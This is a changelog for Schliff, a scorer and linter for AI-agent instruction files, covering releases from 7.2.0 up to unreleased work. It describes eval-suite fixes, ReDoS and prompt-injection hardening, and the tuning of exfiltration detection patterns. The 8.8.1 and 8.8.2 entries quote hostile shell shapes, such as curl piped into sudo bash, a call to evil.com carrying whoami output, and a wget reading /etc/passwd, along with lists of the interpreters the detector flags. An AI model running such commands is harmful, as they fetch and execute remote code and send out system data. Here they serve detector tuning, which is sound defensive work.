# Changelog

All notable changes to Schliff are documented here.
Format follows [Keep a Changelog](https://keepachangelog.com/).

## [Unreleased]

### Changed

- **The bundled eval suite measured its own source, so it measured nothing.** All 108
  `contains` assertions in `skills/schliff/eval-suite.json` appear verbatim in the
  241-line card the suite was generated from; only 54 of them appear in the prompt they
  were filed under. A suite extracted from an artifact scores that artifact 100% by
  construction — which is exactly what it did, reporting 119/119 and a composite of
  98.9 for a card that a real agent scored 0 of 8 on.

  The 44 trigger prompts and 14 edge cases are unchanged. The test cases are re-derived
  from their prompts and from the public CLI surface: 4 cases, 13 assertions, each one
  answering "what would a card need to contain for an agent to do what this prompt
  asks". Against this card they pass 13/13; against a minimal placeholder card, 1/13 —
  so they discriminate rather than describe.

  Test cases whose prompts asked for things that do not exist were dropped rather than
  satisfied: there is no `discovery mode` and no `high-ROI` ranking (zero occurrences
  in `scripts/`), and no custom-metric interface. The 241-line card and its original
  suite are kept intact as frozen fixtures under
  `skills/schliff/tests/fixtures/self-skill-baseline/`.

- **Loop documentation now lives with the loop.** Ten of the suite's test cases probed
  the autonomous improvement loop but asserted against `SKILL.md`, forcing the
  agent-facing card to carry the vocabulary of a subsystem reachable only through the
  `/schliff:*` plugin commands. That coverage moved to
  `tests/unit/test_command_docs_document_the_loop.py`, which gates the command docs
  that actually own the behaviour.

- **Self-test floors measure the property instead of a proxy.** `test-self.sh`'s
  composite floor drops 90 → 85 (matching the same assert in `test.yml`, which was
  skipped rather than passing on the red run), because the 90 was only ever met by the
  circular measurement above. The `>= 100 lines` guard is replaced by `structure >= 90`:
  it was rejecting a deliberate 99-line trim while accepting padding. Measured on this
  card and two degradations — full 95, worked examples stripped 85, gutted to bare
  commands 75 — so the replacement catches both losses the line count caught.

### Fixed

- **The card-executable test wrote into the repo's own score history.** It ran each
  documented command with the working directory set to the package, and `verify` appends
  to `.schliff/history.jsonl` *relative to the working directory* — so every test run
  added three throwaway entries recording `32.7 [F]` for a tmpdir copy of the card — the
  data `progress.py`, `diff` and `/schliff:report` read. It accounted for 61 of the 212
  throwaway rows in this repo's history; the rest are older residue from tests that stopped
  doing this in June. The commands now run from the sandbox, which also makes the test more
  faithful: the card's promise is that they work from anywhere.

- **An assertion the evaluator could not run counted as one the skill failed.**
  `run-eval.sh` evaluated patterns with `grep -qiE … 2>/dev/null` inside an `if`, and
  grep's exit status carries three outcomes rather than two: 0 matched, 1 did not match,
  **2 could not compile the pattern**. `timeout` adds 124. All of them collapsed into
  `passed: false` with the reason discarded.

  What that cost, measured: six assertions in the previous suite were dead on CI for
  months (`main` reported 113/119 there against 119/119 on a developer machine, whose
  `grep` was a more permissive implementation), and the reason was unobtainable — which
  is how a **wrong** diagnosis about the generator ended up published in a commit
  message. The swallow does not only produce dead tests, it makes confident wrong
  statements about them the only available move.

  Unrunnable assertions are now reported as such: `pass_rate` gains an `errored` count,
  the affected `binary_results` entry carries an `error` explaining which construct grep
  refused, and a warning goes to stderr. They are **excluded from the pass-rate
  denominator** and **not written to `.schliff/failures.jsonl`** — an assertion that
  cannot execute is evidence about the suite, not about the skill, and `/schliff:triage`
  clusters that file into proposed SKILL.md fixes.

  Note the ReDoS guard above the call never covered this: it rejects *expensive*
  patterns, not invalid ones — `validate_regex_complexity("[")` returns ok.

  **Output contract:** `pass_rate.errored` is new; `binary_results[].error` appears only
  on unrunnable assertions. Both additive.

- **Two gates so the fix cannot rot.** Excluding errored assertions shrinks the
  denominator, so a decaying suite could report a *rising* pass rate — one runnable
  assertion out of thirteen reads 100%. `test-self.sh` therefore asserts `errored == 0`
  on schliff's own suite (verified red by injecting `(` — the pass rate stayed at a
  reassuring 100% while only the new assertion moved). And `test-integration.sh` now runs
  a suite `init-skill.py` generated instead of only checking that its JSON parses, which
  turns the generator's contract from shape into property.

- **`/schliff:auto` documented a flag that does not exist and a state file it does not
  write.** `commands/schliff/auto.md` listed `--resume`, which `auto-improve.py` rejects
  with `unrecognized arguments` and exit 2 — the same defect class as the `doctor <dir>`
  fix above it. It attributed the loop's history to `.schliff/history.jsonl`, which
  belongs to `verify --history`; the loop writes `.schliff/auto-improve-state.jsonl`.
  Its invocation assumed a working directory of `skills/schliff`.

  It also implied parallel worktree experimentation. `auto-improve.py` detects the stuck
  condition and prints `Triggering parallel branching…`, then continues in-process — no
  branch, no worktree. The doc now says so, and a test asserts it keeps saying so.

  Added, all verified by running the driver first: the cross-session episode store
  (`~/.schliff/meta/episodes.jsonl`, recalled before iterating and written after), the
  per-iteration record shape, the undocumented three-consecutive-errors stop, and the
  real output format.

## [8.8.2] - 2026-07-29

### Fixed

- **The exfil sink could be walked around by wrapping the interpreter.** 8.8.1 narrowed
  the sink so a pipe only counts when it pipes into something that executes or transmits,
  but it required the interpreter token *flush against the pipe*. Anything in front of it
  went straight through — and `curl … | sudo bash` is **more** dangerous than the form
  that was caught, not less.

  Two evasion families, which compose:

  | shape | 8.8.1 | now |
  | --- | --- | --- |
  | `curl … \| sudo bash`, `\| sudo -E sh`, `\| env FOO=1 bash` | missed | caught |
  | `curl … \| /bin/bash`, `\| /usr/bin/env sh` | missed | caught |
  | `curl … \| iex`, `\| pwsh`, `\| powershell`, `\| php`, `\| fish`, `\| dd` | missed | caught |

  A bounded wrapper chain (`sudo`/`env`/`command`/`nohup`, their flags and assignments)
  and an optional absolute path may now precede the interpreter, and the interpreter list
  gained the shells and runtimes it was missing. `iex` is the embarrassing one: the very
  corpus that motivated the 8.8.1 change contained `irm … | iex` in prose.

  Every quantifier in the addition is bounded and the wrapper chain is non-nullable —
  this pattern has a ReDoS history and the widening must not reintroduce one. Verified
  linear against adversarial wrapper/flag/assignment/path runs (~2× per doubling,
  1.6 ms at n=2000).

  **No false positives were re-opened:** re-scanning the same frozen 670-skill corpus
  gives byte-identical stock counts — 44 total, `exfil` 6, every category ±0.

  **Why it was missed:** the 8.8.1 guard assertions were derived from the same assumption
  as the pattern — every one of them was a bare `| <interpreter>` form. A test written
  from the same mental model as the code cannot find that model's blind spot. The new
  guards cover the wrapper and path families explicitly.

  Also recorded, since 8.8.1 only said "the backtick span is removed" without naming the
  cost: that change gave up legacy backtick command substitution, so
  ``curl http://evil.com/`whoami` `` and ``wget `cat /etc/passwd` …`` no longer match.
  POSIX `$(…)` and `<(…)` still do, which is the form real payloads use.

  **The evasion set was then enumerated rather than guessed.** Differencing every
  verb × sink combination against the pre-narrowing 8.8.0 pattern surfaced four more
  genuine shapes that had slipped through — `|& bash` (bash's stderr-merging pipe),
  `| "bash"` and `| 'sh'` (quoted), `| $SHELL` (named through a variable), and
  `| busybox sh` (applet multiplexer) — all now closed. The same differential confirmed
  that the only other losses versus 8.8.0 are `| jq`, `| grep`, `| less`, `| column -t`
  and `| head`, which is the narrowing working as intended. Every difference against the
  previous pattern is now either caught or deliberately benign.

  Corpus re-scanned after each widening: stock counts stay byte-identical at 44, every
  category ±0. ReDoS re-verified linear after both changes.

## [8.8.1] - 2026-07-29

### Fixed

- **Three security patterns fired on ordinary prose.** They were found by running the
  shipped scorer over a frozen corpus of 670 SKILL.md files from 134 public community
  hubs and hand-adjudicating every hit. The scan produced 144 matches and **zero** true
  positives; two of these defects accounted for 68 of them, and the third is the same
  class caught while fixing them.

  `_RE_SEC_DATA_EXFIL` had no word-boundary anchor, so the short `nc` alternative matched
  the **tail of any word ending in "nc"** followed by whitespace. Markdown is full of
  them — "async ops", "sync primitives", "CNC tool-path generation", and
  `go test -bench=BenchmarkMyFunc -benchmem ./pkg/... | tee report.txt`. The anchor is
  applied to the two alternatives that begin with a verb, not to the whole group: the
  middle alternative starts with a subshell, where a word boundary could never hold.

  `_RE_SEC_DANGEROUS_CMD` treated `rm -rf /` as a prefix, so it matched
  `rm -rf /<any absolute path>` and reported the canonical Docker layer cleanup
  `rm -rf /var/lib/apt/lists/*` as a root wipe. The recursive-force alternatives now
  require the target to be root itself.

  `_RE_SEC_ENV_LEAK` had the identical missing anchor as the exfil pattern — `cat` and
  `log` are the tails of `concat`/`logcat` and `catalog`/`changelog`/`blog`. **Unlike the
  other two this one is latent, not observed:** it produced zero false positives in the
  corpus, where all 17 of its matches were genuine verb invocations. It is fixed for
  consistency and because the exposure is broad — the same corpus carries 290 occurrences
  of 27 distinct carrier words, each one nearby secret token away from firing. Its match
  count on the corpus is unchanged at 17, confirming no genuine match was lost.

- **The exfil sink read markdown syntax as shell syntax.** `_RE_SEC_DATA_EXFIL` accepted
  a bare `|` or any backtick span as evidence of a pipe or command substitution. The
  input is markdown, which reuses both characters for entirely different things — `|`
  separates table cells, backticks mark inline code — so ordinary API documentation
  matched: a table row reading "Fetch full transcripts for source files", or the prose
  "if the response `Content-Type` is". One skill was flagged on a passage **warning its
  users not to pipe curl into bash**.

  A pipe now counts only when it pipes into something that executes or transmits
  (`sh`, `bash`, `python3`, `node`, `eval`, `nc`, `curl`, `tee`, `xargs`, `base64`, …).
  The backtick span is removed. `$(` and `<(` stay, since markdown does not reuse those.

  **Recall note, stated plainly:** the field corpus contains **zero** genuine exfil
  detections — every one of its exfil hits was adjudicated a false positive, including
  the hit on the genuinely malicious fixture, whose real payload is caught by
  `obfuscation` rather than here. The corpus therefore cannot demonstrate that recall
  was preserved; only the guard assertions in
  `tests/unit/test_security_field_false_positives.py` do, and they were written to carry
  that weight.

  **Impact, measured on the same 670-file corpus, all four fixes together:** stock
  matches **144 → 44** (−69%). `exfil` 106 → 6, `dangerous_cmd` 13 → 0, `env_leak`
  unchanged. Files scoring a perfect 100 on security: **598 → 650**. Files tripping the
  advisory gate (`SECURITY_GATE = 70`) — every one of them a false alarm, since the
  corpus yielded zero true positives — **27 → 6**, and of the six that remain, one is
  the genuinely malicious fixture and one an openly declared red-team skill. No file
  gained a match.

  **Narrowed, not disarmed.** The four genuinely hostile files keep every real
  detection: `injection` and `obfuscation` counts are byte-identical, and the single
  `exfil` hit that disappeared was itself the false positive "Check curl is installed:
  `which curl`".

  **Not affected:** schliff's own `AGENTS.md` and `README.md` match neither pattern
  before or after, so the published hero score and badge do not move. Golden scores are
  unchanged.

  **For external files:** security scores can only rise, never fall — the change removes
  penalties, it never adds them.

  Both defects are pinned as repo-named regressions in
  `tests/unit/test_security_field_false_positives.py`, each false-positive case paired
  with a guard asserting the genuine attack shape still matches, so a future change
  cannot silence a detector instead of narrowing it.

## [8.8.0] - 2026-07-28

### Changed

- **An unrecognised `<runner> run <target>` no longer counts as a build command
  (#133).** `operational_coverage` credited the `build` category whenever a
  `run`/`r`/`exec`/`dlx` keyword had been consumed — without ever inspecting the
  target. `npm run wibble` scored a build; `npm run test-unit` scored a build
  rather than a test; and the identical script written as `yarn test-unit`, with
  no keyword to consume, was dropped entirely. The engine reported "real build
  command resolved" about a target it had not looked at.

  Such commands now carry the family `unclassified`: real and runnable, family
  undetermined. This mirrors the doctrine `check-commands` already follows —
  claim `dangling` only when provable, otherwise `unknown`.

  `pylint` joined the intrinsic test tools, where the 16 other linters already
  sat, so `uv run pylint` is now classified `test` instead of losing its family
  along with the fallback.

  **Impact:** `unclassified` credits no category, so files that documented no
  build step stop being scored as if they did. Over the 30-file AGENTS.md corpus
  exactly one file moves (80.6 → 72.6, one B→C reclassification); mean 61.79 →
  61.53, median/min/max unchanged. Golden re-derived from the engine.

  **Not affected:** `check-commands` resolves the identical command set — proven
  set-identical over 259 real instruction files (409 command/status tuples, zero
  difference, zero new `dangling` claims). `make test-unit` and friends remain
  outside the vocabulary by design; loosening that guard was measured to buy 2
  genuine commands at the cost of 14 non-commands, and is documented in the
  README rather than changed.

- **Output contract:** `schliff check-commands --json` may now emit
  `"family": "unclassified"`. Existing values are unchanged and `status` is
  untouched, but consumers that switch on `family` should treat it as an open set.

## [8.7.0] - 2026-07-22

### Changed

- **The `structure` score is now reproducible — a pure function of the file's
  bytes (#10).** It previously depended on the file's on-disk neighbourhood (a
  sibling `references/` directory and whether declared references resolved on
  disk), so the *same* file scored ~15 points higher in its real directory than
  in isolation — the public badge disagreed with the author's own CLI, worst on
  AGENTS.md (structure weight 0.4). Now:
  - Progressive disclosure is credited from **content** — markdown links to local
    `.md` detail files (and anchored `references/` paths) — not from a
    `references/` directory a reader is never pointed to. `scripts/` build-command
    mentions no longer count. Tiered: ≥2 links → full credit, 1 → partial, 0 → none.
  - The referenced-files component credits well-formed declared references from
    content, with a traversal (`..`) / ref-stuffing guard that also prevents the
    linter from ever being used as a filesystem existence oracle.
  - Dangling-reference detection is preserved as a **non-scoring lint issue**,
    emitted only from a provable on-disk location, so it never fires falsely in an
    isolated or temp-scored context.
  - This also corrects a long-standing under-crediting of AGENTS.md/CLAUDE.md/
    `.cursorrules`, which are always scored through a normalized temp copy: their
    content disclosure links are now credited. **Scores for files that link detail
    move upward** — including this repo's own AGENTS.md (91.6 [A] → 93.6 [A]), which
    now scores identically in-repo and in isolation. Golden scores were rebaselined
    with documented values; field-validated over 115 real installed skills. A new
    isolation-equivalence test pins that a file scores the same with and without
    its on-disk siblings.

### Fixed

- **The terminal no longer silently drops score warnings (#22).** The calibrated-
  weights "not comparable" notice and the "no weighted dimensions" warning — both
  already present in the JSON output — were dropped from the terminal rendering.
- **`compare` no longer leaks the `-1` sentinel (#21).** Unmeasured dimensions
  (triggers/quality/edges with no eval suite) were rendered as literal `-1.0`
  rows and produced phantom deltas; they are now excluded, mirroring the terminal
  score display.

## [8.6.3] - 2026-07-22

### Security

- **Hardened the engine against untrusted input in third-party CI.** A pre-launch
  adversarial audit reproduced these before fixing; no golden score changes
  (`operational_coverage`/profile byte-identical).
  - **ReDoS** in the security exfil/env-leak patterns: the greedy `[^\n]*` after a
    verb prefix was O(n²) on a newline-free line (~1h CPU at the 1MB read cap,
    reachable ungated via a `.txt` that auto-detects as a system prompt). Bounded to
    `[^\n]{0,200}`.
  - **Quadratic DoS** in the clarity scorer (runs on every default instruction-file
    score): the action-pair extractor scanned the full tail of a newline-free line
    per match (~3min at the cap). Bounded the tail slice.
  - **Filesystem-boundary oracles** in `check-commands`: a symlinked `Makefile`/
    `package.json` or an escaping `bun run <path>` was read/probed outside the repo
    root, turning resolved/dangling verdicts into an out-of-repo content/existence
    oracle. Added a `realpath`+`commonpath` containment guard at each manifest read.

### Fixed

- **`--format <alias>` token budget.** The short aliases (`cursor`, `agents`,
  `claude`, `skill`, `system-prompt`) fell back to the unknown=1500 budget instead
  of their real one, flipping the within-budget verdict. They now resolve via
  `FORMAT_ALIASES` before the lookup.
- **Dead playground link.** The Action's PR comment linked `play.schliff.dev`
  (never registered, NXDOMAIN); repointed to the live playground.

## [8.6.2] - 2026-07-21

### Added

- **GitHub Action surfaces dangling commands.** The `AGENTS.md Lint` action now
  runs `check-commands` for `AGENTS.md`/`CLAUDE.md` and renders any dangling
  commands as a section in its existing PR comment. New opt-in `fail-on-dangling`
  input (default `false`) and `dangling_count` output. Requires schliff ≥ 8.6.1
  for false-positive-safe behavior; older engines degrade silently.

### Fixed

- **`check-commands` workspace false positives + resolver hardening.** A large
  adversarial review + council + a field sweep of 135 real repos found the 8.6.1
  check still reporting working commands as `dangling` on monorepos. Every change
  only demotes `dangling`→`unknown` (never a new false claim); `operational_coverage`
  is untouched, so scoring is byte-identical. A field diff over 140 real repos: 17 →
  4 dangling claims, every removal workspace-justified.
  - **Workspace-aware demotion** (the real false-positive class): a `<pm> run <script>`
    missing from the ROOT manifest is `unknown`, not `dangling`, when the repo declares
    workspaces (`pnpm-workspace.yaml` or a truthy `workspaces` key) — the script may
    live in a child package.
  - **Denial-of-service input-budget guard** on attacker-authored docs (5000 lines /
    2048 bytes-per-line / 256 distinct commands → all-`unknown`, no per-command work),
    plus per-call memoization of manifest parses.
  - **realpath containment** for the interpreter path check, closing a symlink
    existence-oracle.
  - **Accurate report lines** — the real extraction line is threaded from the
    extractor, retiring a quadratic substring scan that could mislocate the line and
    bypass the `cd` demotion.
  - **Dequoted script tokens** and `--if-present` handling (a missing script is not a
    hard error) → `unknown`.

## [8.6.1] - 2026-07-21

### Fixed

- **`check-commands` false positives on real repos.** An adversarial review plus a
  field sweep of real monorepos (palantir/blueprint, remotion, remix, swc) found
  the 8.6.0 check reporting working commands as `dangling` — the exact
  credibility-fatal error its conservative contract exists to prevent. All are now
  correctly `resolved`/`unknown`; every fix only demotes `dangling`→`unknown`, so
  the check can never gain a false claim, and `operational_coverage` is untouched
  (scoring unchanged). Classes fixed:
  - `cd sub/dir && npm run x` — the extractor drops the `cd`, so the script
    resolved against the repo-root manifest (standard monorepo idiom).
  - `(cd x && npm run build)` — the trailing paren clung to the token.
  - `bun run index.ts` / `bun run dist/out.js` — bun resolves scripts, then files,
    then binaries; absence is unprovable, so bun never yields `dangling`.
  - `yarn tsc` / `yarn run x` — every yarn form falls back to `node_modules/.bin`.
  - `make -C dir target` — the directory was read as the target.
  - `pnpm run -r build` — the flag was read as the script name.
  - `$(TARGETS):` and `%.o: %.c` — variable/pattern targets are not enumerable, so
    the target set is treated as incomplete.
- **`check-commands` denial-of-service on attacker-authored build files.** Parsing
  a consumer's `Makefile`/`package.json` in CI is untrusted input:
  - `include` fan-out had no visited-set (N**5 file opens; 15s at N=12) → iterative
    worklist, O(files).
  - the `include` regex backtracked quadratically on long whitespace (15.7s on one
    800KB line) → linear.
  - `include ../../outside` was opened (a read primitive outside the checkout) →
    realpath-contained to the repo root.
  - a deeply-nested `package.json` raised `RecursionError` (a `RuntimeError`, not
    caught) and crashed the check → now degrades to `unknown`.

## [8.6.0] - 2026-07-20

### Added

- **`check-commands`** — a deterministic CI gate that flags setup/build/test
  commands in an `AGENTS.md`/`CLAUDE.md` that don't resolve to a real make
  target, npm script, or path in the repo (exit 1 if dangling). Reuses the
  `operational_coverage` command extractor (no scoring impact); false-positive
  safe (unprovable absence → `unknown`, never `dangling`); live-hardened against
  ~70 real repos. schliff dogfoods it against its own `AGENTS.md` in CI. (#112)

### Fixed

- **`operational_coverage` object-first prohibitions**, badge temp-dir leak, and
  badge error caching (#110).

## [8.5.0] - 2026-07-07

### Fixed

- **`verify` scores under the detected format profile** (#102, closes #101).
  It previously hand-rolled the SKILL scorer set, so `schliff verify AGENTS.md`
  scored the file under the wrong profile and failed spuriously (27.7/F on a
  file `score` grades 91.6/A). Now wired like `score`/`badge`:
  `detect_format → build_scores(fmt) → compute_composite(fmt=fmt)`. SKILL.md
  verdicts are unchanged.
- **Positional negation in `operational_coverage`** (#96): contrastive
  sentences ("run X, never Y directly") keep the recommended command instead
  of discarding both.
- **Dead-marker detector matches marker tokens, not English prose** (#97,
  closes #93): UPPERCASE tokens/stubs count; words like "placeholder" in
  prose no longer false-positive. Corpus goldens re-derived.

### Security

- **Runtime scorer prompt hardened** (#99): skill content is nonce-wrapped
  (`<skill_context_NONCE>`) so crafted files cannot forge the prompt
  structure. Defense-in-depth — the dimension remains opt-in and gated off.

### Added

- Instant star-count notify workflow for the profile-repo badge (#98).
- Theme-aware README hero (light/dark SVG) + social-preview asset (#106).
- Dependabot now groups github-actions bumps into one PR — split bumps of
  lockstep actions (codeql init/analyze) could never pass CI (#107).

### Docs

- **README redesigned** (#100): AGENTS.md-first, every number ground-truthed
  against the released engine, ShieldClaw case-study table disambiguated
  (ceiling vs quality), hydra field study added, new "What the score does not
  measure" section, Marketplace listing linked.

## [8.4.0] - 2026-07-03

### Added

- **`operational_coverage` dimension for AGENTS.md** (PR #83). Measures whether
  an AGENTS.md actually equips a coding agent to operate the repo: real
  setup/build/test commands (command-family classification, doc-wide, headings
  never gate) plus code-style / gotchas / PR directive sections with concrete
  code tokens. Surfaced in the CLI dimension table, the Action's PR comment,
  and accepted by the leaderboard submit API.

### Changed

- **BREAKING (scores): AGENTS.md headline profile is now
  `structure 0.40 / operational_coverage 0.40 / efficiency 0.20`** (was
  0.5/0.5). `efficiency` was a validated gameable proxy — a junk-fence-stuffed
  doc scored 92.5/A while the same real commands inline scored 70.0/C. All
  AGENTS.md scores re-baseline: 30-file corpus mean 61.06, no file reaches S.
  SKILL.md / CLAUDE.md / .cursorrules / system-prompt scoring is byte-identical.

### Security

- Fixed a ReDoS in the operational_coverage heading regex (quadratic on
  whitespace-only heading lines; playground/Action/leaderboard take untrusted
  input). Found and fixed pre-release by a 75-agent adversarial review, along
  with a directive-gate homonym gaming hole, a fence-state desync on
  info-string openers, and 12 command-recall bugs — see
  `docs/specs/agents-md-operational-coverage.md` §11.

## [8.3.0] - 2026-06-25

### Added

- **AGENTS.md scoring profile.** `AGENTS.md` is project context for coding agents,
  not a reusable skill, so it is now scored on a dedicated headline
  (`0.5·structure + 0.5·efficiency`) instead of the SKILL.md rubric. The
  eval-gated dimensions (triggers/quality/edges) plus the mis-fit composability and
  the saturated clarity are excluded from the headline denominator, and the
  nonsensical "add an eval suite" warning is suppressed for this format. A
  well-formed `AGENTS.md` now scores a defensible B/A instead of a capped ~28/None.
  Other formats (`SKILL.md`/`CLAUDE.md`/`.cursorrules`/`system_prompt`) are
  byte-identical. Spec: `docs/specs/agents-md-scoring-profile.md`. (#67)
- `suggest`/`evolve` no longer emit SKILL-only advice (frontmatter, eval-suite,
  handoffs) for `AGENTS.md`. (#67)
- **GitHub Action rebranded to "AGENTS.md Lint".** `action.yml` now lives at the
  repository root (Marketplace-eligible), defaults to scoring a root `AGENTS.md`
  (`skill-path` is optional), and posts a format-aware scored PR comment. Usable as
  `uses: Zandereins/schliff@v1`. (#66, #68, #69)

### Fixed

- The Action's PR comment no longer renders unmeasured (`null`) dimensions as a
  misleading `0/100`; they are omitted, matching the engine's terminal output. (#68)

## [8.2.0] - 2026-06-11

### Added

- Public **Vercel deployments**: an interactive playground (`POST /api/score`, real scoring
  engine) and a community leaderboard (`/api/submit`, `/api/query`). (#50, #54)
- Leaderboard **durable storage on Upstash Redis (Vercel KV, $0)** — atomic dedup upsert that
  survives cold starts, plus a KV-backed per-IP rate limiter; transparent ephemeral `/tmp`
  fallback when KV is not configured. (#58, #59)
- **CodeQL** SAST workflow (`security-extended`, SHA-pinned, least-privilege). (#59)
- Machine-readable version output / agentic-integration groundwork. (#57)

### Changed

- **BREAKING: drop Python 3.9 support** — minimum supported version is now Python 3.10
  (`requires-python = ">=3.10"`). Python 3.9 reached end-of-life on 2025-10-31. The CI test
  matrix and ruff `target-version` were updated accordingly. (#55)
- Modernized license metadata to the PEP 639 SPDX expression form (`license = "MIT"`), dropping
  the deprecated `License :: OSI Approved :: MIT License` classifier. Requires `setuptools>=77`. (#55)
- Playground now reports an **honest structural score** (renormalized over the four deterministic
  dimensions) instead of a coverage-capped composite; removed a phantom `sync` dimension. (#54)

### Fixed

- Leaderboard submit read-modify-write **race + non-atomic write** (now flock-serialized +
  atomic `os.replace`). (#58)
- Vercel deployability (score.py `sys.path` bootstrap, `framework:null`, build-artifact
  gitignore), JSON crash guard, `install.sh` hardening, CLI error UX, and web
  a11y/contrast/keyboard + Google-Fonts CSP. (#50, #53, #55, #56)

### Security

- **Fix ReDoS / remote CPU-DoS in the scoring engine.** `_RE_REAL_EXAMPLES` / `_RE_DIFF_EXAMPLE`
  used an unbounded `input.*output` (O(n²) under `findall`); a ~256KB single-line payload via the
  public playground pegged a serverless function's CPU for ~90s. Bounded to `input.{0,200}?output`
  (linear), regression-guarded, and the playground caps scored input at 32KB as defense-in-depth. (#59)
- **Prompt-injection hardening** — nonce-wrap untrusted skill content in the judge and runtime
  evaluators; pre-validate regex complexity. (#56)
- Hardened web security headers across both apps: CSP (playground drops `script-src
  'unsafe-inline'` via a sha256 pin), HSTS, **Permissions-Policy**, X-Frame-Options, nosniff,
  Referrer-Policy, `Cache-Control: no-store`. (#50, #56, #59)
- **Bound durable leaderboard submissions** (global 500/3600s + 10000-entry size cap) against
  persistent pollution; NFKC + invisible-character dedup-bypass guard; generic 500s. (#50, #58, #59)
- Supply chain & repo posture: SHA-pinned actions, OIDC trusted publishing, pinned `schliff` in
  the web apps, `.env*.local` gitignored, and `main` branch protection (required CI checks). (#59)

## [8.1.0] - 2026-06-03

### Added

- Multi-agent correctness/security/determinism hardening (PR #46): calibrated weights gated
  behind `SCHLIFF_CALIBRATED_WEIGHTS` (off by default) so `verify`/`badge`/leaderboard stay
  reproducible; `weight_source`/`weights_hash` provenance; BOM-invariant scoring at the read
  boundary; ReDoS-safe secret redaction; format-aware composite weighting across the CLI.
- CI lint gate: `ruff` now runs and gates in GitHub Actions (baseline cleaned to zero findings).
- Community-health files: `CODE_OF_CONDUCT.md` (Contributor Covenant 2.1) and an
  issue-template `config.yml`. Top-level `--version`/`-V` flag.

### Changed

- README + `docs/` redesign: accurate full-denominator composite model (replaces the previously
  inverted description in `SCORING.md`), correct dimension/weight tables, single-sourced version,
  current architecture with diagrams. Web playground/leaderboard corrected to the canonical model
  (removed a non-existent dimension, fixed repository links, hardened CSP).
- Packaging: CLI version is single-sourced via `importlib.metadata` (no more hardcoded drift).
- Performance: `doctor` single tree-walk, O(n) header lookup in `structure`, cached regexes/MinHash.

### Removed

- Internal launch corpus and marketing drafts from the public tree (regenerable via
  `skills/schliff/scripts/launch/`); untracked local tooling artifacts.

## [8.0.0] - 2026-05-29

### Added

- Failure-mode-first AI-Eval foundation: sprint spec + 7 ADRs, Phase-0 open-coded failure-mode
  taxonomy (10 snapshotted skills), Phase-1 calibration scaffold.
- Deterministic judge guards (`scoring/guards.py`): destructive-command, gating-invariant
  (linter-completeness floor), and mixed-script detectors — staged for the v8.1 judge harness, not
  wired into the live linter; they carry no composite weight.
- Judge v0 smoke-test harness (`judge/judge_v0.py`, optional `[judge]` extra): pinned model,
  structured output, mock-testable. Calibration is FROZEN as v8.1 backlog (4 live runs plateaued at
  directional 7/11; resumes only when distribution yields real users + a concrete quality miss).
- GitHub Action (`action/action.yml`) to score skills as a CI / PR quality gate.
- Plugin-marketplace install: schema-valid `.claude-plugin/marketplace.json`
  (`/plugin marketplace add Zandereins/schliff`) plus `npx skills add` support.
- Leaderboard scoring-model epoch versioning: v7-scale and v8-scale composites never co-rank;
  `?score_model=N` selects a scale (default = the latest epoch present).

### Changed

- **BREAKING (scoring):** Composite is now computed over a single canonical 7-dimension basis
  with a full denominator — unmeasured dimensions are uncredited (not silently renormalized away).
  Scores for skills without an eval suite are lower and now reflect coverage. This unifies the
  `score`/`doctor`/`bench` and `evolve` paths (one number per file) and closes the anti-gaming gap
  where a gamed skill could match a clean one at composite level. Security is reported as a separate
  signal/gate, no longer folded into the headline. CI thresholds (`fail if score<N`) may need
  re-tuning. See `docs/superpowers/specs/2026-05-26-audit-followups-design.md`.
- Anti-gaming: added a spread-keyword-stuffing penalty (efficiency dimension) and a composite
  separation gate (`benchmarks/anti-gaming`) asserting every gamed skill scores below a clean control.
- `verify` is now coverage-aware: the pass threshold scales with measured coverage
  (effective_min = min_score × coverage), so skills without an eval suite are judged against a
  structural bar instead of the unreachable full default. Adding an eval suite raises the bar to
  the full surface.
- Cold-start UX: the partial-coverage message reads as an invitation (ℹ "add an eval suite to score
  the rest"), not a scold (⚠ "uncredited / ceiling").
- README leads with native install (`/plugin marketplace add`, `npx skills add`); pip demoted to CLI/CI.

### Fixed

- `missing_refs` (structure): referenced files resolve skill-local OR against an enclosing
  plugin/.git root (fixes false-positives on plugin-monorepo layouts), with full paths in the
  message; plus path-traversal confinement (reject `..`, resolve-confine) so an untrusted SKILL.md
  cannot probe the filesystem.
- `evolve._score_file` auto-discovers the eval suite, matching `schliff score`.
- Public playground reframes a partial-coverage result as a "Structural Score" with a neutral
  coverage chip instead of a red failing grade (no second scale introduced).
- Public endpoints: hard cap on decoded skill text (compute-DoS bound) + read-cap vs a lying
  Content-Length; leaderboard responses tagged `verified:false` / `unverified:true`.
- `commands/schliff/mesh.md` registered as `/mesh` instead of `/schliff:mesh`.

### Security

- Pre-launch audit (3 parallel lenses + Hydra closing council): removed tracked internal docs that
  contradicted the pitch; SECURITY.md version table + network/exec claims scoped to the zero-dep core.

## [7.2.0] - 2026-04-24

### Security

- **Prompt-injection hardening in `schliff evolve`**: user-authored skill
  content is wrapped in explicit XML tags with a per-call random nonce
  before being passed to LLM prompts. Earlier versions fed raw content
  into the meta-prompt, letting a crafted SKILL.md inject directives.
  A sanitizer rejects XML-tag injection attempts and an explicit
  `<user_content>…</user_content>` boundary isolates user input.
- **CLI error-handling with no traceback leaks**: `schliff score` on a
  directory or oversized file no longer leaks a raw Python traceback.
  `read_skill_safe` rejects directories explicitly with a clear
  `ValueError`; `cli.main()` wraps handler dispatch in one
  `(OSError, ValueError)` try/except that renders a short `Error: …`
  line on stderr and exits 1.

### Fixed

- **Scoring robustness across all dimensions**: all five scorers that
  consume user-authored eval-suite JSON (`edges`, `triggers`, `quality`,
  `runtime`, `coherence`) now guard their list-valued fields with
  `isinstance(…, list)` checks. Pre-fix, a truthy non-list
  (`{"edge_cases": 42}`, `{"triggers": "abc"}`) crashed the scorer with
  `TypeError` from `len()` or `AttributeError` from `.get()` on a string
  character. Post-fix each scorer returns its standard sentinel (score
  −1 / bonus 0) on malformed input; inner `assertions` and `test_case`
  items are filtered via `_assertion_dicts` helpers.
- **`score_edges` category guard**: malformed `category` entries (ints,
  nulls, lists) no longer crash `.startswith()` during known-category
  coverage.
- **`install.sh` and `analyze-skill.sh` POSIX portability**: replaced
  GNU-only `\s` / `\S` in `grep -E` patterns with POSIX character classes
  `[[:space:]]` / `[^[:space:]]`. On older macOS (classic BSD grep),
  the installer previously printed "Schliff v unknown" and `analyze-skill.sh`
  missed name / example detection.
- **Score-to-grade consistency**: playground, evolve, GitHub Action, and
  CI badges now share the canonical E-band (35–49) from
  `terminal_art.score_to_grade`; previously each surface drifted.

### Changed

- **E-band grade now emitted in badge/CI output.** Consumers that parse
  a grade field with a closed set of `{S, A, B, C, D, F}` must now accept
  `E` as well. **Breaking for JSON consumers** that did exhaustive grade
